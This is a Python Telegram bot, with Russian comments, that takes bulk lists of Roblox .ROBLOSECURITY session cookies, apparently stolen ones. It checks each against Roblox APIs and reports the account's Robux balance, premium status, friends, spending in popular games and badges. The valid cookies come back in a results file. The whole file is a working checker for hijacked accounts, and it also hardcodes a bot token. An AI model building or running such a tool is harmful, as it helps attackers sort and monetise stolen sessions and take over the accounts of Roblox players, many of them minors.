import telebot
import requests
import io
import re
from datetime import datetime
from flask import Flask
from threading import Thread

# === НАСТРОЙКИ ===
TOKEN = '8526516729:AAHxx09k48kWRk0U7q2AcFSCmEdg3TDcfEw'
bot = telebot.TeleBot(TOKEN)

app = Flask('')
@app.route('/')
def home(): return "Бот активен"

def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

GAME_DATA = {
    "BRAZILIAN SPYDER": {"name": "Steal a brainrot", "universe_id": 6144841331},
    "Uplift Games": {"name": "Adopt me", "universe_id": 231221121},
    "Wave of Brainrots": {"name": "Tsunami brainrots", "universe_id": 6344131331},
    "Nikilis": {"name": "MM2", "universe_id": 66654135},
    "The Garden Game": {"name": "GAG", "universe_id": 5834131131},
    "KizmoTek Studio": {"name": "War tycoon", "universe_id": 2686721523},
    "Gamer Robot Inc": {"name": "Blox fruits", "universe_id": 444227218}
}

def extract_cookie(text):
    """Вытаскивает куки из строки, даже если там логин:пароль"""
    match = re.search(r"(_\|WARNING:-DO-NOT-SHARE-THIS\..+)", text)
    return match.group(1).strip() if match else None

def get_extra_info(u_id):
    try:
        u_data = requests.get(f"https://users.roblox.com/v1/users/{u_id}").json()
        reg_dt = datetime.strptime(u_data['created'], "%Y-%m-%dT%H:%M:%S.%fZ")
        days = (datetime.now() - reg_dt).days
        premium = "Да ✅" if u_data.get('hasPremium', False) else "Нет ❌"
        
        f_data = requests.get(f"https://friends.roblox.com/v1/users/{u_id}/friends/count").json()
        return reg_dt.strftime("%d.%m.%Y"), days, premium, f_data.get('count', 0)
    except: return "??", 0, "??", 0

def get_created_places(u_id):
    """Получает список игр, созданных пользователем"""
    try:
        url = f"https://games.roblox.com/v2/users/{u_id}/games?accessFilter=Public&limit=10&sortOrder=Desc"
        res = requests.get(url, timeout=5).json()
        games = [g['name'] for g in res.get('data', [])]
        return "\n • " + "\n • ".join(games) if games else "Нет созданных игр"
    except: return "Скрыто"

def get_game_badges(u_id, universe_id, cookies):
    try:
        url = f"https://badges.roblox.com/v1/users/{u_id}/universes/{universe_id}/badges?limit=3"
        res = requests.get(url, cookies=cookies, timeout=3).json()
        badges = [b['name'] for b in res.get('data', [])]
        return " (🏆: " + ", ".join(badges) + ")" if badges else ""
    except: return ""

def check_cookie(raw_text):
    cookie = extract_cookie(raw_text)
    if not cookie: return {"status": "error"}
    cookies = {".ROBLOSECURITY": cookie}
    
    try:
        u_req = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies, timeout=10)
        if u_req.status_code != 200: return {"status": "error"}
        u = u_req.json()
        u_id, u_name = u['id'], u['name']
        
        # Инфо
        reg_date, age_days, premium, friends = get_extra_info(u_id)
        robux = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies).json().get('robux', 0)
        
        # Заменяем недавние игры на созданные
        created = get_created_places(u_id)
        
        # Траты
        sales = requests.get(f"https://economy.roblox.com/v2/users/{u_id}/transactions?transactionType=Purchase&limit=50", cookies=cookies).json()
        spent_details = {}
        total_spent = 0
        if 'data' in sales:
            for item in sales['data']:
                amount = abs(item.get('currency', {}).get('amount', 0))
                creator = item.get('agent', {}).get('name', 'Unknown')
                if creator in GAME_DATA:
                    g_name = GAME_DATA[creator]["name"]
                    if g_name not in spent_details:
                        badges = get_game_badges(u_id, GAME_DATA[creator]["universe_id"], cookies)
                        spent_details[g_name] = {"sum": 0, "badges": badges}
                    spent_details[g_name]["sum"] += amount
                    total_spent += amount

        details_text = "".join([f" • {n}: {d['sum']} R$ {d['badges']}\n" for n, d in spent_details.items()])
        
        return {
            "status": "ok", "name": u_name, "id": u_id, "robux": robux, "age": age_days,
            "reg_date": reg_date, "premium": premium, "friends": friends,
            "created_games": created, "details": details_text or "Трат нет\n", "spent": total_spent, "cookie": cookie
        }
    except: return {"status": "error"}

def format_output(res):
    return (
        f"👤 Аккаунт: {res['name']} (ID: {res['id']})\n"
        f"🗓 Регистрация: {res['reg_date']} ({res['age']} дн.)\n"
        f"🌟 Premium: {res['premium']} | 👥 Друзья: {res['friends']}\n"
        f"💰 Баланс: {res['robux']} R$\n\n"
        f"🛠 СОЗДАННЫЕ ИГРЫ: {res['created_games']}\n\n"
        f"💸 ТРАТЫ:\n{res['details']}"
        f"--- Всего по списку: {res['spent']} R$ ---\n\n"
        f"🍪 КУКИ:\n`{res['cookie']}`\n"
        f"{'='*30}\n"
    )

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "👋 Привет! Пришли куки или .txt файл.")

@bot.message_handler(content_types=['text', 'document'])
def handle(message):
    try:
        if message.content_type == 'text' and len(message.text) > 100:
            res = check_cookie(message.text)
            if res['status'] == 'ok': bot.send_message(message.chat.id, format_output(res), parse_mode="Markdown")
        elif message.content_type == 'document':
            file_info = bot.get_file(message.document.file_id)
            lines = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore').splitlines()
            bot.send_message(message.chat.id, f"⌛ Чек {len(lines)} строк...")
            results = [format_output(res) for l in lines if l.strip() and (res := check_cookie(l))['status'] == 'ok']
            if results:
                buf = io.BytesIO("".join(results).encode('utf-8'))
                buf.name = "results.txt"
                bot.send_document(message.chat.id, buf)
            else: bot.send_message(message.chat.id, "❌ Валид не найден.")
    except Exception as e: print(e)

if __name__ == '__main__':
    keep_alive()
    bot.infinity_polling()
